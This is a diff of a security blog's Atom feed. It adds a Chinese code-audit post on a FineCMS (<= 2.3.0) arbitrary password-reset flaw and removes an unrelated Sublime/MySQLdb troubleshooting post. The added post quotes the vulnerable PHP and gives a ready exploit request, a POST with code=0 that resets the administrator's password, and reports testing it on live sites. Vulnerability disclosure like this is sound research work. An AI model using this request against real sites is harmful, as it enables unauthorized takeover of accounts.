@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-03-02T07:07:45.000Z</updated>
+  <updated>2016-03-03T14:38:18.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -13,6 +13,68 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[finecms <= 2.3.0 任意用户密码修改]]></title>
+    <link href="http://xdxd.love/2016/03/03/finecms-2-3-0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/"/>
+    <id>http://xdxd.love/2016/03/03/finecms-2-3-0-任意用户密码修改/</id>
+    <published>2016-03-03T14:32:33.000Z</published>
+    <updated>2016-03-03T14:38:18.000Z</updated>
+    <content type="html"><![CDATA[<p>影响版本14年4月18号更新的2.3.0及以前的版本。最新版不存在这个问题。<br>乌云爆过一个<a href="http://www.wooyun.org/bugs/wooyun-2014-060197" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2014-060197</a> 利用暴力破解验证码的方式来重置密码，这里讨论的方式相对于暴力破解来说成本更低。</p>
+<p>直接看代码验证验证码的逻辑：逻辑分析下载注释中。</p>
+<p>case 2:</p>
+<pre><code>                        <span class="variable">$uid</span> = (int)<span class="variable">$this-</span>&gt;input-&gt;get(<span class="string">'uid'</span>);
+                        <span class="variable">$code</span> = (int)<span class="variable">$this-</span>&gt;input-&gt;post(<span class="string">'code'</span>);
+                        从post获取验证码。
+                        <span class="variable">$data</span> = <span class="variable">$this-</span>&gt;db
+                                                 -&gt;<span class="keyword">where</span>(<span class="string">'uid'</span>, <span class="variable">$uid</span>)
+                                                 -&gt;<span class="keyword">where</span>(<span class="string">'randcode'</span>, <span class="variable">$code</span>)
+                          根据验证码和UID从数据库中查询数据。
+                                                 -&gt;select(<span class="string">'salt,uid,username,email'</span>)
+                                                 -&gt;limit(<span class="number">1</span>)
+                                                 -&gt;get(<span class="string">'member'</span>)
+                                                 -&gt;row_array();
+                        <span class="keyword">if</span> (!<span class="variable">$data</span>) {
+                        如果查不到该验证码对应的数据，提示错误。
+        <span class="variable">$this-</span>&gt;member_msg(lang(<span class="string">'m-000'</span>));
+    }
+
+                        <span class="variable">$password1</span> = <span class="variable">$this-</span>&gt;input-&gt;post(<span class="string">'password1'</span>);
+                        <span class="variable">$password2</span> = <span class="variable">$this-</span>&gt;input-&gt;post(<span class="string">'password2'</span>);
+                        <span class="keyword">if</span> (<span class="variable">$password1</span> != <span class="variable">$password2</span>) {
+                                <span class="variable">$error</span> = lang(<span class="string">'m-019'</span>);
+                        } elseif (!<span class="variable">$password1</span>) {
+                                <span class="variable">$error</span> = lang(<span class="string">'m-018'</span>);
+                        } <span class="keyword">else</span> {
+                                // 修改密码
+                                <span class="variable">$this-</span>&gt;db
+                                         -&gt;where(<span class="string">'uid'</span>, <span class="variable">$data</span>[<span class="string">'uid'</span>])
+                                         -&gt;update(<span class="string">'member'</span>, array(
+                        成功修改密码之后，验证码randcode设置为<span class="number">0</span>！！！！！
+                                                <span class="string">'randcode'</span> =&gt; <span class="number">0</span>,
+                                                <span class="string">'password'</span> =&gt; md5(md5(<span class="variable">$password1</span>).<span class="variable">$data</span>[<span class="string">'salt'</span>].md5(<span class="variable">$password1</span>))
+                                         ));
+                                if (<span class="variable">$this-</span>&gt;get_cache(<span class="string">'MEMBER'</span>, <span class="string">'setting'</span>, <span class="string">'ucenter'</span>)) {
+            uc_user_edit(<span class="variable">$data</span>[<span class="string">'username'</span>], <span class="string">''</span>, <span class="variable">$password1</span>, <span class="string">''</span>, <span class="number">1</span>);
+        }
+                                <span class="variable">$this-</span>&gt;member_msg(lang(<span class="string">'m-052'</span>), dr_url(<span class="string">'login/index'</span>), <span class="number">1</span>);
+                        }
+                        break;
+        }
+}
+</code></pre><p>这里一个逻辑问题就是，修改密码之后，验证码设置为零。去数据库中看了一下，这个字段的默认值是0，而判断验证码之前没有对验证码是否是0进行判断。导致使用0作为验证码可以直接修改任意账号的密码。这种方式在黑盒的任意密码重置案例中并没有见到过。<br><img src="/images/finecms5.jpg" alt=""></p>
+<p>利用方式，直接post url：</p>
+<pre><code><span class="string">http:</span><span class="comment">//www.<span class="label">xxxxxxx.com/member/index.php?c=login&amp;m=find&amp;step=2&amp;uid=1</span></span>
+</code></pre><p>这里uid=1为管理员。 post 数据为code=0&amp;password1=12345678&amp;password2=12345678<br>在互联网实例中测试。</p>
+<p><img src="/images/finecms6.jpg" alt=""></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>影响版本14年4月18号更新的2.3.0及以前的版本。最新版不存在这个问题。<br>乌云爆过一个<a href="http://www.wooyun.org/bugs/wooyun-2014-060197" target="_blank" rel="external">ht]]>
+    </summary>
+    
+      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[centos 6安装mitmproxy]]></title>
@@ -1043,37 +1105,6 @@ retdata['<span class="literal">result</span>'],retdata['error'] = ret
       <category term="ctf" scheme="http://xdxd.love/tags/ctf/"/>
     
       <category term="黑盒测试" scheme="http://xdxd.love/categories/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[瞎折腾之sublime插件导入第三方库]]></title>
-    <link href="http://xdxd.love/2015/11/16/%E7%9E%8E%E6%8A%98%E8%85%BE%E4%B9%8Bsublime%E6%8F%92%E4%BB%B6%E5%AF%BC%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93/"/>
-    <id>http://xdxd.love/2015/11/16/瞎折腾之sublime插件导入第三方库/</id>
-    <published>2015-11-16T08:47:47.000Z</published>
-    <updated>2015-11-24T03:27:38.000Z</updated>
-    <content type="html"><![CDATA[<p>花了好几个小时解决了一个问题，走了不少弯路，需要总结分析一下。</p>
-<p>需求只是想用写一个sublime插件来完成一些sql操作。python操作sql，很自然的想用MySQLdb库。但是sublime使用的是自己的python环境，跟系统是隔离的。通过stackoverflow得知基本只有两个思路导入第三方库。一个是指定第三方库的路径，加入到sys.path中，另一个就是改变sublime自身使用的python环境。</p>
-<p>改变python自身的环境一般被认为具有比较高的风险，容易引起各种问题。所以最终定位下载第三方库的代码，修改sys.path。下载MySQLdb的代码之后，import MySQLdb报错，_mysql.so不存在。在本地的python库路径里看了一下，有这个文件。复制到sublime插件目录，结果又报错找不到libmysqlclient.18.dylib。这里有两个解决方式，一个是做一个软连接，但是新版mac os做了安全限制，/usr/lib目录不可以写了。关闭安全限制又不是我理解的恰当的方式，最后参考<a href="http://webcache.googleusercontent.com/search?q=cache:94BSd8uENDAJ:xwsoul.com/posts/840+&amp;cd=5&amp;hl=en&amp;ct=clnk&amp;gl=us&amp;lr=lang_en%7Clang_zh-TW" target="_blank" rel="external">MAC OS 下解决 IMPORT MYSQLDB 报错的问题</a>,使用</p>
-<pre><code>install_name_tool -change libmysqlclient.<span class="number">18</span>.dylib /usr/local/mysql/<span class="class"><span class="keyword">lib</span>/<span class="title">libmysqlclient</span>.18.<span class="title">dylib</span> <span class="title">_mysql</span>.<span class="title">so</span></span>
-</code></pre><p>修改了引用的路径，结果还是报错</p>
-<pre><code><span class="constant">Symbol</span> not <span class="symbol">found:</span> _PyString_Type
-  <span class="constant">Referenced</span> <span class="symbol">from:</span> /usr/local/<span class="class"><span class="keyword">lib</span>/<span class="title">python2</span>.7/<span class="title">site</span>-<span class="title">packages</span>/<span class="title">_mysql</span>.<span class="title">so</span></span>
-  <span class="constant">Expected</span> <span class="symbol">in:</span> flat namespace
-</code></pre><p>看到网上的一些帖子，基本修改了_mysql.so的引用就解决了。</p>
-<p>期间还去github上搜代码，只找到一个sublime插件试用了mysqldb，也是sublime2。</p>
-<p>这时候考虑到看到的所有的帖子都说的是sublime2，而我用的是sublime3。思路变成本地安装python3环境，重新安装python3的MySQLdb库，再复制到sublime路径。本地安装python3的MySQLdb库时发现也报错了，开始以为是python3环境有问题，搜了一下发现原来是MySQLdb不支持python3。</p>
-<p>折腾了好久最后是这个结果。找了几个MySQLdb的替代品，发现pymysql是纯python的库，为了避免浪费更多的时间折腾一些底层的东西，直接就用pymysql了。几分钟解决了问题。</p>
-<p>之前遇到的问题几乎google都有现成的方案，这次sublime3 MySQLdb的问题，网上资料很少，最后基本能看的资料都看了。没有新的资料可以参考，突然感觉有点点恐惧。自己解决问题的方式基本是完全依赖Google，基本不用思考，因为google错误提示完全都可以解决。当尝试了多个方案依然无法解决问题的时候就突然不知所措了。这时候才发现原来自己根本没有仔细思考，仔细分析过这个问题。静下来，在本子上理一下现有的田间，要做的事，分析一下可能的思路，可能就不会不知所措了。</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>花了好几个小时解决了一个问题，走了不少弯路，需要总结分析一下。</p>
-<p>需求只是想用写一个sublime插件来完成一些sql操作。python操作sql，很自然的想用MySQLdb库。但是sublime使用的是自己的python环境，跟系统是隔离的。通过stackov]]>
-    </summary>
-    
-      <category term="折腾" scheme="http://xdxd.love/tags/%E6%8A%98%E8%85%BE/"/>
-    
-      <category term="折腾不止" scheme="http://xdxd.love/categories/%E6%8A%98%E8%85%BE%E4%B8%8D%E6%AD%A2/"/>
     
   </entry>
   
